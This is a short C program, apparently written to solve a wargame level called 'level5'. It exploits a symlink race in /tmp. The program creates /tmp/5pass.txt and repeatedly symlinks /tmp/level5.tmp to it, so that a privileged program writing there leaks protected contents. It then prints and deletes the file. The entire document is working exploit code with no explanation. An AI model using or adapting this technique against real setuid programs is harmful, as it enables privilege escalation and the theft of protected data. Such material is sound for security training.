// This will make the link 5pass.txt file when /tmp/level5.tmp will be creating

#include <unistd.h>

int main()
{
        int i;
        system("touch /tmp/5pass.txt");
        for(i=0; i<=10; i++)
        {
                system("ln -s /tmp/5pass.txt /tmp/level5.tmp");
        }
        system("cat /tmp/5pass.txt");
        system("rm -rf /tmp/5pass.txt");
}
